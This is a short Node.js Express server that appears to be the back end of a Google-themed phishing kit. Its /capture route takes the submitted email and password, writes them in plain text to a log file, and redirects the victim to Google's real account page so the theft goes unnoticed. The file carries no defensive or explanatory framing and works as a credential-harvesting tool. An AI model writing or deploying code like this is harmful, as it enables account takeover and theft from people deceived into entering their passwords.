const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post("/capture", (req, res) => {
  const { email, password } = req.body;
  const log = `Email: ${email}, Password: ${password}\n`;
  fs.appendFileSync("log.txt", log);
  res.redirect("https://myaccount.google.com/");
});

app.listen(3000, () => console.log("Server running at http://localhost:3000"));
